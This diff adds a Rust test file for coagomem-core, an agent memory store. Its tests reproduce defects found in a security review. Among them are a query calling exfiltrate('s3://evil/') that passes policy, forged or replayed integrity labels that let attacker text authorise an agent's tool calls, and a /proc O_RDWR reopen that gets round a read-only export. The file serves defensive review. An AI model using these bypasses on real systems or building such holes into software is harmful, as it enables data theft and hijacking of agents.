@@ -1,0 +1,465 @@
+//! Round-5 independent review: defect REPRODUCTION tests.
+//!
+//! Convention: every `r5_defect_*` test PASSES when the defect described in its doc comment
+//! is still present. When a fix lands, the test must FAIL; then invert its assertion and
+//! move it to `v30_regressions.rs` as a guard. `r5_ok_*` tests check properties that hold.
+//!
+//! Run: cargo test --release --offline -p coagomem-core --test r5_review
+use coagomem_core::*;
+use coagomem_ql::{BoolExpr, CompOp, FieldPath, Literal, Predicate, Query, Root, Value};
+use std::sync::atomic::{AtomicU64, Ordering};
+
+fn session(tenant: u128, ops: u64) -> VerifiedMacaroon {
+    let k = KeyedPrf([9; 32]);
+    Macaroon::issue(
+        &k,
+        vec![
+            Caveat::Tenant(tenant),
+            Caveat::ExpiresAt(100),
+            Caveat::PeerUid(1000),
+            Caveat::Ops(ops),
+            Caveat::KeyEpoch(2),
+        ],
+    )
+    .unwrap()
+    .verify(
+        &k,
+        &RequestCtx {
+            tenant_incarnation: tenant,
+            key_epoch: 2,
+            now_ns: 1,
+            op_bit: OP_READ,
+            peer_uid: 1000,
+        },
+    )
+    .unwrap()
+}
+
+fn tmp(name: &str) -> std::path::PathBuf {
+    static N: AtomicU64 = AtomicU64::new(0);
+    std::env::temp_dir().join(format!(
+        "r5-{name}-{}-{}",
+        std::process::id(),
+        N.fetch_add(1, Ordering::Relaxed)
+    ))
+}
+
+// ---------------------------------------------------------------- D: CiaQL
+
+/// R5-Q1: MAX_LIST (256) is applied to vector literals, so MAX_VECTOR_DIMS (4096) is
+/// unreachable and any realistic embedding (384..3072 dims) is rejected by the parser.
+#[test]
+fn r5_defect_q1_vector_dims_capped_at_256() {
+    let v = |n: usize| vec!["0.1"; n].join(",");
+    let ok = format!("@1 similarity(vector: [{}], metric: cosine, threshold: 0.5)", v(256));
+    assert!(parse_ciaql(&ok).is_ok());
+    let real = format!("@1 similarity(vector: [{}], metric: cosine, threshold: 0.5)", v(768));
+    let err = parse_ciaql(&real).unwrap_err();
+    assert!(format!("{err:?}").contains("list too long"), "{err:?}");
+}
+
+/// R5-Q2: function calls with arbitrary names are accepted as mutation values and pass
+/// policy; the grammar is not fail-closed for unknown functions.
+#[test]
+fn r5_defect_q2_unknown_function_call_accepted_by_parser_and_policy() {
+    let q = parse_ciaql(r#"ACTOR(1) |> MUTATE { state.x = exfiltrate("s3://evil/", 1) }"#).unwrap();
+    let token = session(11, OP_READ | OP_WRITE);
+    let owner = |_| Some(11);
+    let auth = AuthContext {
+        session: &token,
+        owner_of: &owner,
+        allowed_destinations: &[],
+    };
+    assert_eq!(validate_query(&q, &auth), Ok(()));
+}
+
+/// R5-Q3: `$ref:` literals carry only a 64-bit id; the 16-byte RefToken MAC cannot be
+/// expressed in CiaQL, so an executor resolving refs from a query has nothing to verify.
+#[test]
+fn r5_defect_q3_ref_literal_has_no_mac() {
+    let q = parse_ciaql(r#"ACTOR(1) |> MUTATE { state.r = $ref:0x99A4F012 }"#).unwrap();
+    let Stage::Mutate(m) = &q.stages[0] else { panic!() };
+    let coagomem_ql::Mutation::Assign { value, .. } = &m[0] else { panic!() };
+    assert_eq!(*value, Value::Ref(0x99A4_F012)); // u64 only: no MAC field exists
+}
+
+/// R5-Q4: a caller-built AST with deep BoolExpr nesting is walked recursively by
+/// validate_query_ast/validate_query, so it crashes the process (stack overflow), not
+/// a structured InvalidQuery. Executed in a child process.
+#[test]
+fn r5_defect_q4_deep_caller_ast_overflows_stack() {
+    if std::env::var("R5_CHILD").is_ok() {
+        return;
+    }
+    let out = std::process::Command::new(std::env::current_exe().unwrap())
+        .args(["--exact", "r5_child_deep_ast", "--ignored", "--nocapture"])
+        .env("R5_CHILD", "1")
+        .output()
+        .unwrap();
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(!out.status.success(), "child unexpectedly survived: {stderr}");
+    assert!(
+        stderr.contains("overflow") || out.status.code().is_none(),
+        "unexpected failure mode: {stderr}"
+    );
+}
+
+#[test]
+#[ignore]
+fn r5_child_deep_ast() {
+    std::thread::Builder::new()
+        .stack_size(512 * 1024)
+        .spawn(|| {
+            let mut e = BoolExpr::Pred(Predicate {
+                field: FieldPath {
+                    actor: None,
+                    root: Root::State,
+                    path: vec!["x"],
+                    at: 0,
+                },
+                op: CompOp::Eq,
+                rhs: Value::Lit(Literal::Int(1)),
+            });
+            for _ in 0..200_000 {
+                e = BoolExpr::And(vec![e]);
+            }
+            let q = Query {
+                source: Source::Actor(1),
+                stages: vec![Stage::Filter(e)],
+            };
+            let r = coagomem_ql::validate_query_ast(&q);
+            eprintln!("validate returned {r:?}");
+            std::mem::forget(q); // drop is also recursive; isolate the validator
+        })
+        .unwrap()
+        .join()
+        .unwrap();
+}
+
+// ---------------------------------------------------------------- C: policy
+
+/// R5-P1: a bucket-root (or directory-root) allowlist entry denies every object under it,
+/// because the parsed root path is "" and only prefixes ending in '/' are prefix-matched.
+#[test]
+fn r5_defect_p1_bucket_root_allowlist_denies_everything() {
+    assert!(!destination_allowed("s3://backups/2026/x.tar", &["s3://backups/"]));
+    assert!(!destination_allowed("/var/backups/ciagomem/x", &["/var/backups/ciagomem/"]));
+    // A one-level prefix works, which shows the root case is the anomaly.
+    assert!(destination_allowed("s3://backups/d/x", &["s3://backups/d/"]));
+}
+
+/// R5-P2: OP_OPERATOR is a bit inside a tenant-scoped macaroon; a tenant-11 operator token
+/// authorises SCAN over the whole fleet with no owner checks on the scanned actors.
+#[test]
+fn r5_defect_p2_tenant_operator_token_scans_fleet() {
+    let token = session(11, OP_READ | OP_OPERATOR);
+    let owner = |id| Some(if id == 1 { 11 } else { 22 });
+    let auth = AuthContext {
+        session: &token,
+        owner_of: &owner,
+        allowed_destinations: &[],
+    };
+    assert_eq!(validate_query(&parse_ciaql("scan actors[*]").unwrap(), &auth), Ok(()));
+}
+
+/// R5-P3: HYDRATE_FRAME takes a bare 64-bit frame hash that is not bound to the actor
+/// or tenant; policy accepts any value.
+#[test]
+fn r5_defect_p3_hydrate_frame_hash_unbound() {
+    let token = session(11, OP_READ);
+    let owner = |_| Some(11);
+    let auth = AuthContext {
+        session: &token,
+        owner_of: &owner,
+        allowed_destinations: &[],
+    };
+    for q in ["ACTOR(1) |> HYDRATE_FRAME(0xDEADBEEF)", "@1 hydrate_frame(0xDEADBEEF)"] {
+        if let Ok(q) = parse_ciaql(q) {
+            assert_eq!(validate_query(&q, &auth), Ok(()));
+            return;
+        }
+    }
+    panic!("hydrate syntax not recognised; adjust test");
+}
+
+// ---------------------------------------------------------------- E: information flow
+
+/// R5-F1: Label::new / public `integrity` let any caller mint Policy-integrity labels, so
+/// HardConstraint admission needs no endorsement. The S6 fix only covers the endorsement path.
+#[test]
+fn r5_defect_f1_label_integrity_is_caller_forgeable() {
+    let k = KeyedPrf([3; 32]);
+    let forged = Label::new(Integrity::Policy, 2, vec![11]).unwrap();
+    assert!(admit_to_frame(FrameField::HardConstraint, forged, None, &k, 11, 1).is_ok());
+    let mut l = Label::new(Integrity::External, 2, vec![11]).unwrap();
+    l.integrity = Integrity::Policy; // pub field
+    assert!(admit_to_frame(FrameField::HardConstraint, l, None, &k, 11, 1).is_ok());
+}
+
+/// R5-F2: endorsements bind (tenant, sources mask, expiry) only. One endorsement is
+/// replayable onto other content, other fields, and onto any label with sources == 0.
+#[test]
+fn r5_defect_f2_endorsement_replay_and_zero_sources() {
+    let k = KeyedPrf([4; 32]);
+    let e = Endorsement::issue(&k, 11, 0b10, 100);
+    let content_a = Label::new(Integrity::AgentDerived, 0b10, vec![11]).unwrap();
+    let content_b = Label::new(Integrity::AgentDerived, 0b10, vec![11]).unwrap();
+    let no_sources = Label::new(Integrity::AgentDerived, 0, vec![11]).unwrap();
+    assert!(admit_to_frame(FrameField::ActiveIntent, content_a, Some(&e), &k, 11, 1).is_ok());
+    assert!(admit_to_frame(FrameField::Playbook, content_b, Some(&e), &k, 11, 2).is_ok());
+    assert!(admit_to_frame(FrameField::ActiveIntent, no_sources, Some(&e), &k, 11, 3).is_ok());
+}
+
+/// R5-F3: an endorsed label becomes UserDirect and then authorises side-effecting tool
+/// calls; combined with F2 a single endorsement authorises unrelated side effects.
+#[test]
+fn r5_defect_f3_replayed_endorsement_authorises_side_effects() {
+    let k = KeyedPrf([4; 32]);
+    let e = Endorsement::issue(&k, 11, 0b10, 100);
+    let attacker_text = Label::new(Integrity::AgentDerived, 0b10, vec![11, 77]).unwrap();
+    let up = admit_to_frame(FrameField::ActiveIntent, attacker_text, Some(&e), &k, 11, 5).unwrap();
+    assert!(gateway_allow(true, &up, 77));
+}
+
+// ---------------------------------------------------------------- B/C: tenant identity
+
+/// R5-T1: TenantRegistry has no persistent id->incarnation map. After restart the same
+/// tenant receives a NEW incarnation, orphaning its macaroons, refs and data. The shipped
+/// s5 test asserts this inequality as if it were the fix.
+#[test]
+fn r5_defect_t1_restart_orphans_existing_tenant() {
+    let p = tmp("orphan");
+    let k = KeyedPrf([7; 32]);
+    let a = TenantRegistry::new(IncarnationStore::create(&p).unwrap())
+        .register(&k, "ns", "acme")
+        .unwrap();
+    let b = TenantRegistry::new(IncarnationStore::open(&p).unwrap())
+        .register(&k, "ns", "acme")
+        .unwrap();
+    assert_eq!(a.0, b.0);
+    assert_ne!(a.1, b.1, "same live tenant got a different incarnation after restart");
+    std::fs::remove_file(p).unwrap();
+}
+
+/// R5-T2: restoring an older journal (backup/restore, snapshot rollback) rewinds the
+/// counter, and inc = PRF(id || counter) re-issues a previously used incarnation (S5).
+#[test]
+fn r5_defect_t2_journal_rollback_reissues_incarnation() {
+    let p = tmp("rollback");
+    let k = KeyedPrf([7; 32]);
+    drop(
+        TenantRegistry::new(IncarnationStore::create(&p).unwrap())
+            .register(&k, "ns", "acme")
+            .unwrap(),
+    );
+    let backup = std::fs::read(&p).unwrap();
+    let second = TenantRegistry::new(IncarnationStore::open(&p).unwrap())
+        .register(&k, "ns", "acme")
+        .unwrap();
+    std::fs::write(&p, &backup).unwrap(); // operator restores yesterday's journal
+    let third = TenantRegistry::new(IncarnationStore::open(&p).unwrap())
+        .register(&k, "ns", "acme")
+        .unwrap();
+    assert_eq!(second.1, third.1, "incarnation re-issued after journal rollback");
+    std::fs::remove_file(p).unwrap();
+}
+
+/// R5-T3: a zero-filled 32-byte tail (ext4 size update without data, or a torn append)
+/// makes `open` fail, blocking boot instead of discarding the unacknowledged suffix.
+#[test]
+fn r5_defect_t3_zero_tail_blocks_boot() {
+    use std::io::Write;
+    let p = tmp("zero");
+    let mut r = TenantRegistry::new(IncarnationStore::create(&p).unwrap());
+    r.register(&KeyedPrf([7; 32]), "ns", "acme").unwrap();
+    drop(r);
+    std::fs::OpenOptions::new()
+        .append(true)
+        .open(&p)
+        .unwrap()
+        .write_all(&[0u8; 32])
+        .unwrap();
+    assert!(IncarnationStore::open(&p).is_err());
+    std::fs::remove_file(p).unwrap();
+}
+
+// ---------------------------------------------------------------- B: truncation
+
+/// R5-D1: TruncationPins::on_checkpointed(t) takes no checkpoint LSN. A mutation applied
+/// after the checkpoint snapshot (tenant already dirty, so on_dirty is a no-op) is
+/// forgotten when the checkpoint completes, and min_needed_lsn lets the log drop it.
+#[test]
+fn r5_defect_d1_checkpoint_forgets_mid_checkpoint_mutation() {
+    let mut p = TruncationPins::new(4);
+    p.on_dirty(1, 10, 0).unwrap(); // first dirty at LSN 10
+    // checkpoint of tenant 1 snapshots state as of LSN 10 and starts writing ...
+    p.on_dirty(1, 20, 0).unwrap(); // mutation at LSN 20 during the write: no-op
+    p.on_checkpointed(1).unwrap(); // image covers <= 10 only
+    // The log may now be truncated up to 30, discarding LSN 20 which no image contains.
+    assert_eq!(p.min_needed_lsn(30), 30);
+}
+
+// ---------------------------------------------------------------- B: extent images
+
+/// R5-I1: ExtentImage::validate checks tenant (dense u32), magic and CRC but not epoch or
+/// incarnation, so a stale image of a deleted tenant validates for a reused dense index,
+/// and the higher image_seq wins A/B selection.
+#[test]
+fn r5_defect_i1_stale_incarnation_image_validates() {
+    use coagomem_core::envelope::ExtentImage;
+    let body = vec![0xAAu8; 4096 - 64];
+    let old = ExtentImage {
+        tenant: 5,
+        layout_version: 1,
+        checkpoint_lsn: 900,
+        epoch: 1,
+        image_seq: 77,
+    };
+    let mut bytes = vec![0u8; 4096];
+    for (i, w) in old.header_words(&body).iter().enumerate() {
+        bytes[i * 8..i * 8 + 8].copy_from_slice(&w.to_le_bytes());
+    }
+    bytes[64..].copy_from_slice(&body);
+    let got = ExtentImage::validate(&bytes, 5).expect("validated");
+    assert_eq!(got.epoch, 1); // caller in epoch 9 / new incarnation is never asked
+}
+
+// ---------------------------------------------------------------- A: export window
+
+/// R5-X1: the CVE-2024-57937 boot self-test maps the O_RDONLY fd. mprotect(PROT_WRITE)
+/// on a MAP_SHARED mapping of a read-only fd fails on every kernel, sealed or not, so the
+/// probe cannot detect a vulnerable kernel. An agent holding the RO fd can, however,
+/// reopen it O_RDWR through /proc, which is the path the CVE concerns.
+#[test]
+fn r5_defect_x1_export_selftest_is_vacuous() {
+    use std::ffi::CString;
+    unsafe {
+        // Unsealed memfd: the same probe still "passes".
+        let fd = libc::memfd_create(CString::new("plain").unwrap().as_ptr(), libc::MFD_CLOEXEC);
+        assert!(fd >= 0);
+        assert_eq!(libc::ftruncate(fd, 4096), 0);
+        let path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();
+        let ro = libc::open(path.as_ptr(), libc::O_RDONLY | libc::O_CLOEXEC);
+        let m = libc::mmap(core::ptr::null_mut(), 4096, libc::PROT_READ, libc::MAP_SHARED, ro, 0);
+        assert_ne!(m, libc::MAP_FAILED);
+        assert_ne!(
+            libc::mprotect(m, 4096, libc::PROT_READ | libc::PROT_WRITE),
+            0,
+            "probe fails even without any seal"
+        );
+        libc::munmap(m, 4096);
+        libc::close(ro);
+        libc::close(fd);
+    }
+    // The agent's RO fd from a real window can be re-opened read-write.
+    let budget = export_window::ExportBudget::new(4096, 1);
+    let w = export_window::SealedExportWindow::create_and_selftest(4096, &budget).unwrap();
+    let path = std::ffi::CString::new(format!("/proc/self/fd/{}", w.agent_ro_fd)).unwrap();
+    let rw = unsafe { libc::open(path.as_ptr(), libc::O_RDWR | libc::O_CLOEXEC) };
+    assert!(rw >= 0, "O_RDWR reopen of the agent fd succeeded; only the seal protects it");
+    unsafe { libc::close(rw) };
+}
+
+// ---------------------------------------------------------------- A: reviewed arena
+
+/// R5-A1: the reviewed arena stores a 128-bit incarnation in the header but `read`
+/// authorises on the dense u32 tenant only; the read API cannot express an incarnation.
+#[test]
+fn r5_defect_a1_reviewed_arena_read_ignores_incarnation() {
+    let a = SlotArena::<4>::new(0, 1, 1);
+    let tw = TenantWord {
+        tenant: 7,
+        core: 0,
+        layout_version: 1,
+        flags: 0,
+    };
+    let h = a.install(0, tw, 0xAAAA_u128, 1, 0).unwrap().unwrap();
+    // A caller authenticated for tenant 7 / incarnation 0xBBBB (a different life) succeeds.
+    assert!(a.read(h, 7, Visibility::Optimistic, |v| v.word(0)).is_ok());
+}
+
+// ---------------------------------------------------------------- holds
+
+/// R5-OK1: unknown macaroon caveats are rejected and HMAC chaining forbids caveat removal.
+#[test]
+fn r5_ok_unknown_caveat_rejected() {
+    let k = KeyedPrf([9; 32]);
+    let m = Macaroon::issue(
+        &k,
+        vec![
+            Caveat::Tenant(11),
+            Caveat::ExpiresAt(100),
+            Caveat::PeerUid(1000),
+            Caveat::Ops(OP_READ),
+            Caveat::KeyEpoch(2),
+            Caveat::Unknown(vec![7]),
+        ],
+    )
+    .unwrap();
+    let ctx = RequestCtx {
+        tenant_incarnation: 11,
+        key_epoch: 2,
+        now_ns: 1,
+        op_bit: OP_READ,
+        peer_uid: 1000,
+    };
+    assert!(m.verify(&k, &ctx).is_err());
+}
+
+// ---------------------------------------------------------------- A: mesh liveness
+
+/// R5-M1: lost wakeup / stranded messages. `drain_lane` refreshes the shared tail only when
+/// `head == cached_tail`. After a budget-limited drain, a later flush's doorbell bit is
+/// consumed while the stale cached tail is drained, `more` is reported false, the pending
+/// bit is cleared, and the newer messages are never delivered (no further doorbell). This
+/// is the cause of the shipped `grid_delivers_fifo_per_lane_without_loss_under_concurrency`
+/// test spinning forever (observed in this review: one consumer at 100% CPU for >7 min).
+#[test]
+fn r5_defect_m1_partial_drain_strands_messages() {
+    let mesh::Mesh {
+        mut producers,
+        mut consumers,
+    } = mesh::Mesh::<u64, 64>::new(1, 1);
+    let p = &mut producers[0][0];
+    let c = &mut consumers[0];
+    for i in 0..10 {
+        p.try_push(i).unwrap();
+    }
+    p.flush();
+    let mut got = Vec::new();
+    assert_eq!(c.poll(5, |_, v| got.push(v)), 5); // budget-limited: lane stays pending
+    for i in 10..20 {
+        p.try_push(i).unwrap();
+    }
+    p.flush(); // sets the doorbell bit again
+    assert_eq!(c.poll(64, |_, v| got.push(v)), 5); // drains only to the stale cached tail
+    let mut later = 0;
+    for _ in 0..100 {
+        later += c.poll(64, |_, v| got.push(v));
+    }
+    assert_eq!(later, 0, "messages 10..20 are stranded");
+    assert_eq!(got.len(), 10);
+    assert!(c.prepare_park(), "consumer is told it may sleep with 10 messages queued");
+}
+
+/// R5-SZ: measured in-memory sizes used by the independent budget (run with --nocapture).
+#[test]
+fn r5_sizes() {
+    use core::mem::size_of;
+    eprintln!("SIZES Label={} VerifiedMacaroon={} Endorsement={} RefToken={} VaultLoc={}",
+        size_of::<Label>(), size_of::<VerifiedMacaroon>(), size_of::<Endorsement>(),
+        size_of::<RefToken>(), size_of::<VaultLoc>());
+    eprintln!("SIZES reviewed SlotHeader={} p0 SlotHeader={} p0 RouteEntry~={} MeshMsg={} CoreControl={}",
+        size_of::<SlotHeader>(), size_of::<slot::SlotHeader>(),
+        size_of::<slot::RouteEntry>(), size_of::<mesh::MeshMsg>(), size_of::<slot::CoreControl>());
+}
+
+/// R5-OK2: the §10 specification example parses; `in` is case-sensitive while `and` is not.
+#[test]
+fn r5_ok_spec_example_parses_and_keyword_case_note() {
+    let ex = "@0x0008F421\nwhere state.status == \"ACTIVE\" and state.wallet.balance_cents >= 5000\nmutate {\n  state.wallet.balance_cents -= 5000,\n  state.metrics.tx_count += 1\n}\nselect {\n  remaining_cents: state.wallet.balance_cents,\n  tx_lsn: meta.last_tx_seq\n}\ntake 5";
+    assert!(parse_ciaql(ex).is_ok(), "{:?}", parse_ciaql(ex).err());
+    assert!(parse_ciaql("@1 where limit > 3").is_ok());
+    eprintln!("lower-case `in`: {:?}", parse_ciaql("@1 where state.x in [1,2]").map(|_| ()));
+    eprintln!("upper-case `IN`: {:?}", parse_ciaql("@1 where state.x IN [1,2]").map(|_| ()));
+}
